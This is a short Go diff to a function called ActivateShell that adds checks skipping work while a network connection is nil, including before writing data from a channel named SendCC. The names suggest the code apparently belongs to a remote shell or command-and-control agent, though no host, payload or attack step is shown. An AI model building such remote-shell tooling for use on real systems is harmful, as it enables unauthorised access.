@@ -49,6 +49,8 @@ func ActivateShell() {
 			if isShellExit {
 				return
 			}
+
+			// if connection does not exist yet
 			if conn == nil {
 				continue
 			}
@@ -67,6 +69,10 @@ func ActivateShell() {
 	for outgoing := range SendCC {
 		if isShellExit {
 			return
+		}
+		// if connection does not exist yet
+		if conn == nil {
+			continue
 		}
 		_, err = conn.Write(outgoing)
 		if err != nil {
